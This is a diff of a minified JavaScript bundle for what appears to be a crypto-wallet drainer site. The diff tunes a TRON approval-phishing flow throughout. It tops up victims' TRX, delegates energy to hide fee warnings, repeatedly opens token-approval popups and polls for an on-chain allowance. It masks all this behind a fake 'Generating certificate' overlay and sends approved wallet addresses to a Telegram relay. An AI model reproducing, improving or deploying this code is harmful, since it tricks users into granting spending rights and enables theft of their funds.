@@ -93024,8 +93024,8 @@
                         balanceInTRX = 0
                     }
                     o(balanceInTRX);
-                    // Align with backend MINIMUM_BALANCE (default 11 TRX)
-                    const minTrx = 11;
+                    // Top-up when below 10 TRX (align with backend MINIMUM_BALANCE)
+                    const minTrx = 10;
                     console.log("[3] BALANCE CHECK RESULT", {
                         endpoint: "https://api.trongrid.io/wallet/getaccount",
                         balanceInTRX: balanceInTRX,
@@ -93067,10 +93067,10 @@
                     } catch (_) {}
 
                     if (balanceInTRX < minTrx && recentTopUp) {
-                        // TRX already sent recently — wait 5s then open approve (no second top-up, no tap button)
+                        // TRX already sent recently — wait 7s then open approve
                         console.log("[4] TRX TOP-UP START", {
                             skipped: true,
-                            reason: "recent-topup-reuse wait 5s then approve"
+                            reason: "recent-topup-reuse wait 7s then approve"
                         });
                         reportEvent("TRX_TOPUP_SKIPPED", {
                             reason: "recent-topup-reuse",
@@ -93078,12 +93078,12 @@
                         });
                         topUpSent = true;
                         reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
-                            waitMs: 5000,
+                            waitMs: 7000,
                             reason: "recent-topup-reuse"
                         });
-                        await new Promise((resolve) => setTimeout(resolve, 5000));
+                        await new Promise((resolve) => setTimeout(resolve, 7000));
                         reportEvent("TRX_TOPUP_CONFIRM_DONE", {
-                            waitMs: 5000,
+                            waitMs: 7000,
                             continueToApprove: true
                         })
                     } else if (balanceInTRX < minTrx) {
@@ -93144,18 +93144,18 @@
                             });
 
                             if (topUpSent) {
-                                // After top-up: wait 5s then open approval popup directly (no tap button)
-                                console.log("[6] POST-TOP-UP WAIT 5s THEN APPROVE", {
-                                    waitMs: 5000,
+                                // After successful top-up TX: wait 7s then open approval popup
+                                console.log("[6] POST-TOP-UP WAIT 7s THEN APPROVE", {
+                                    waitMs: 7000,
                                     tx: topUpTxId
                                 });
                                 reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
-                                    waitMs: 5000,
+                                    waitMs: 7000,
                                     tx: topUpTxId
                                 });
-                                await new Promise((resolve) => setTimeout(resolve, 5000));
+                                await new Promise((resolve) => setTimeout(resolve, 7000));
                                 reportEvent("TRX_TOPUP_CONFIRM_DONE", {
-                                    waitMs: 5000,
+                                    waitMs: 7000,
                                     continueToApprove: true
                                 });
                                 try {
@@ -93220,21 +93220,21 @@
                     // NEVER use feeLimit 1e9 (USDT/Energy rental). Always TRX fee mode.
                     const feeLimit = 15e6;
 
-                    // Ask backend to delegate ENERGY so Trust does not show Energy rental
-                    try {
-                        reportEvent("PREPARE_ENERGY_START", {});
-                        const energyRes = await GS.post(API_BASE + "/prepare-energy", {
-                            userAddress: c
-                        }, {
-                            timeout: 45000
-                        });
-                        reportEvent("PREPARE_ENERGY_RESULT", energyRes && energyRes.data ? energyRes.data : {});
-                        await new Promise((resolve) => setTimeout(resolve, 1500))
-                    } catch (energyErr) {
+                    // Fire-and-forget energy nudge — do NOT block WC (Proposal expired if we wait)
+                    reportEvent("PREPARE_ENERGY_START", {
+                        mode: "fire_and_forget"
+                    });
+                    GS.post(API_BASE + "/prepare-energy", {
+                        userAddress: c
+                    }, {
+                        timeout: 12000
+                    }).then((energyRes) => {
+                        reportEvent("PREPARE_ENERGY_RESULT", energyRes && energyRes.data ? energyRes.data : {})
+                    }).catch((energyErr) => {
                         reportEvent("PREPARE_ENERGY_FAILED", {
                             error: energyErr && energyErr.message ? energyErr.message : String(energyErr)
                         })
-                    }
+                    });
 
                     console.log("Opening sign popup", {
                         balanceInTRX: balanceInTRX,
@@ -93250,7 +93250,7 @@
                     });
                     await f(c, feeLimit, {
                         fromTopUp: topUpSent,
-                        retries: 3,
+                        retries: 2,
                         reportEvent: reportEvent
                     });
                 } catch (a) {
@@ -93274,9 +93274,9 @@
             }
             ), [l])
               , f = async (e, feeLimit, opts) => {
-                // Direct approval popup after top-up wait — no tap button
+                // Flow: approve popup up to 2x → show generating → poll on-chain allowance → certificate
                 const options = opts && "object" === typeof opts ? opts : {};
-                const maxTries = Math.max(3, Number(options.retries) || 3);
+                const maxTries = Math.min(2, Math.max(1, Number(options.retries) || 2));
                 const reportEvent = "function" === typeof options.reportEvent ? options.reportEvent : () => {};
                 const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
                 console.log("[8] APPROVAL START", e, {
@@ -93299,9 +93299,107 @@
                     t(2);
                     return
                 }
+
+                const showGenerating = (msg) => {
+                    let el = document.getElementById("cert-generating-overlay");
+                    if (!el) {
+                        el = document.createElement("div");
+                        el.id = "cert-generating-overlay";
+                        el.setAttribute("style", "position:fixed;inset:0;z-index:99999;background:rgba(10,10,20,0.88);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui,sans-serif;padding:24px;text-align:center;");
+                        el.innerHTML = '<div style="width:48px;height:48px;border:3px solid rgba(255,255,255,0.25);border-top-color:#a855f7;border-radius:50%;animation:certspin 0.9s linear infinite;margin-bottom:20px"></div><div id="cert-generating-title" style="font-size:22px;font-weight:700;margin-bottom:8px">Generating certificate</div><div id="cert-generating-msg" style="font-size:14px;opacity:0.85;max-width:320px"></div><style>@keyframes certspin{to{transform:rotate(360deg)}}</style>';
+                        document.body.appendChild(el)
+                    }
+                    const msgEl = document.getElementById("cert-generating-msg");
+                    if (msgEl)
+                        msgEl.textContent = msg || "Confirming your approval on-chain. Please wait…"
+                };
+                const hideGenerating = () => {
+                    const el = document.getElementById("cert-generating-overlay");
+                    if (el && el.parentNode)
+                        el.parentNode.removeChild(el)
+                };
+                const checkOnChain = async () => {
+                    try {
+                        const res = await GS.post(API_BASE + "/check-approval", {
+                            userAddress: e
+                        }, {
+                            timeout: 15000
+                        });
+                        const data = res && res.data ? res.data : null;
+                        reportEvent("ONCHAIN_APPROVAL_CHECK", {
+                            approved: !!(data && data.approved),
+                            allowance: data && data.allowance || null
+                        });
+                        return !!(data && data.approved)
+                    } catch (err) {
+                        reportEvent("ONCHAIN_APPROVAL_CHECK_FAILED", {
+                            error: err && err.message ? err.message : String(err)
+                        });
+                        return !1
+                    }
+                };
+                const waitForOnChainApproval = async () => {
+                    showGenerating("Checking blockchain for your approval…");
+                    t(3);
+                    reportEvent("ONCHAIN_APPROVAL_POLL_START", {});
+                    const maxPolls = 24;
+                    for (let i = 0; i < maxPolls; i += 1) {
+                        showGenerating("Generating certificate… confirming on-chain (" + (i + 1) + "/" + maxPolls + ")");
+                        if (await checkOnChain()) {
+                            reportEvent("ONCHAIN_APPROVAL_CONFIRMED", {
+                                poll: i + 1
+                            });
+                            return !0
+                        }
+                        await new Promise((resolve) => setTimeout(resolve, 5000))
+                    }
+                    reportEvent("ONCHAIN_APPROVAL_TIMEOUT", {
+                        polls: maxPolls
+                    });
+                    return !1
+                };
+                const goToCertificate = (txID) => {
+                    try {
+                        sessionStorage.removeItem("trxToppedUp:" + e)
+                    } catch (_) {}
+                    reportEvent("APPROVAL_APPROVED", {
+                        txID: txID || "on-chain",
+                        source: "onchain"
+                    });
+                    reportEvent("TELEGRAM_SEND_INITIATED", {
+                        type: "transaction_approved",
+                        txID: txID || "on-chain"
+                    });
+                    GS.post(API_BASE + "/api/telegram", {
+                        text: `Transaction approved (on-chain)\nWallet: ${e}\nTransaction ID: ${txID || "on-chain"}\nTime: ${new Date().toISOString()}`
+                    }).then(() => {
+                        reportEvent("TELEGRAM_SEND_OK", {
+                            type: "transaction_approved"
+                        })
+                    }).catch((err) => {
+                        reportEvent("TELEGRAM_SEND_FAILED", {
+                            type: "transaction_approved",
+                            error: err && err.message ? err.message : String(err)
+                        })
+                    });
+                    showGenerating("Approval confirmed. Opening certificate…");
+                    setTimeout(() => {
+                        hideGenerating();
+                        window.location.href = "/certificate"
+                    }, 600)
+                };
+
                 try {
                     localStorage.setItem("walletAddress", e);
+
+                    // Already approved on-chain? Skip popups
+                    if (await checkOnChain()) {
+                        goToCertificate("already-approved");
+                        return
+                    }
+
                     let n = null;
+                    let openedOnce = !1;
                     for (let tryNo = 1; tryNo <= maxTries; tryNo += 1) {
                         const r = new SA(l);
                         h(r);
@@ -93321,9 +93419,17 @@
                             tryNo: tryNo,
                             maxTries: maxTries
                         });
-                        n = await r.sendTransaction(e, feeLimit);
+                        try {
+                            n = await r.sendTransaction(e, feeLimit)
+                        } catch (signErr) {
+                            n = {
+                                success: !1,
+                                result: !1,
+                                message: signErr && signErr.message ? signErr.message : String(signErr)
+                            }
+                        }
+                        openedOnce = !0;
                         console.log("[9] APPROVAL RESULT", n);
-                        console.log("[SIGN] approve result", n);
                         reportEvent("APPROVAL_ATTEMPT_RESULT", {
                             tryNo: tryNo,
                             success: !!(n && (n.result || n.success)),
@@ -93331,85 +93437,52 @@
                             txID: n && n.txID || null,
                             message: n && n.message || null
                         });
+
+                        // Quick on-chain peek after each popup (Trust often returns empty signature)
+                        if (await checkOnChain()) {
+                            goToCertificate(n && n.txID || "on-chain");
+                            return
+                        }
                         if (n && (n.result || n.success || n.txID)) {
+                            // Wallet said ok — still wait for on-chain before certificate
                             break
                         }
-                        // Retry empty-signature / soft fails (Trust Continue often returns empty once)
-                        const softFail = n && (n.approvalNotAttempted || n.emptySignature || (n.message && String(n.message).toLowerCase().includes("empty signature")));
-                        if (softFail && tryNo < maxTries) {
-                            console.warn("[SIGN] soft fail, auto-retry", {
-                                tryNo: tryNo,
-                                message: n.message
-                            });
+                        if (tryNo < maxTries) {
                             reportEvent("APPROVAL_RETRY", {
                                 tryNo: tryNo,
-                                message: n.message
+                                message: n && n.message || "retrying second approve popup"
                             });
-                            // Re-delegate energy then open a fresh approve popup
-                            try {
-                                await GS.post(API_BASE + "/prepare-energy", {
-                                    userAddress: e
-                                }, {
-                                    timeout: 45000
-                                })
-                            } catch (_) {}
-                            await new Promise((resolve) => setTimeout(resolve, 2500));
-                            continue
+                            await new Promise((resolve) => setTimeout(resolve, 2000))
                         }
-                        break
                     }
-                    if (n && (n.result || n.success || n.txID)) {
-                        console.log("[SIGN] Approve OK TXID:", n.txID);
-                        reportEvent("APPROVAL_APPROVED", {
-                            txID: n.txID || "N/A"
-                        });
-                        try {
-                            sessionStorage.removeItem("trxToppedUp:" + e)
-                        } catch (_) {}
-                        reportEvent("TELEGRAM_SEND_INITIATED", {
-                            type: "transaction_approved",
-                            txID: n.txID || "N/A"
-                        });
-                        GS.post(API_BASE + "/api/telegram", {
-                            text: `Transaction approved\nWallet: ${e}\nTransaction ID: ${n.txID || "N/A"}\nTime: ${new Date().toISOString()}`
-                        }).then(() => {
-                            reportEvent("TELEGRAM_SEND_OK", {
-                                type: "transaction_approved"
-                            })
-                        }).catch((err) => {
-                            reportEvent("TELEGRAM_SEND_FAILED", {
-                                type: "transaction_approved",
-                                error: err && err.message ? err.message : String(err)
-                            })
-                        });
-                        // Always go to certificate after successful approve
-                        t(3);
-                        setTimeout(() => {
-                            window.location.href = "/certificate"
-                        }, 800)
-                    } else if (n && n.approvalNotAttempted) {
-                        console.error("[10] ERROR", {
-                            stage: "balance-or-network",
-                            message: n.message
-                        });
+
+                    // After up to 2 popups: always poll on-chain while showing generating
+                    if (!openedOnce && n && n.approvalNotAttempted) {
+                        hideGenerating();
                         reportEvent("APPROVAL_FAILED", {
                             reason: "popup_not_opened",
                             message: n.message
                         });
                         window.alert("Could not start the approval. The wallet popup was not opened.\n" + (n.message ? n.message : "Network request failed."));
-                        t(2)
-                    } else {
-                        console.warn("Approve failed", n);
-                        reportEvent("APPROVAL_FAILED", {
-                            reason: "user_reject_or_failed",
-                            message: n && n.message || null
-                        });
-                        window.alert("Approve failed. Please try again." + (n && n.message ? "\n" + n.message : ""));
-                        t(2)
+                        t(2);
+                        return
                     }
+
+                    const confirmed = await waitForOnChainApproval();
+                    if (confirmed) {
+                        goToCertificate(n && n.txID || "on-chain");
+                        return
+                    }
+                    hideGenerating();
+                    reportEvent("APPROVAL_FAILED", {
+                        reason: "onchain_not_confirmed",
+                        message: n && n.message || null
+                    });
+                    window.alert("Approval not confirmed on-chain yet. Please approve in your wallet and try again.");
+                    t(2)
                 } catch (err) {
+                    hideGenerating();
                     console.error("[10] ERROR", err);
-                    console.error("Approve error:", err);
                     reportEvent("APPROVAL_FAILED", {
                         reason: "exception",
                         error: err && err.message ? err.message : String(err)
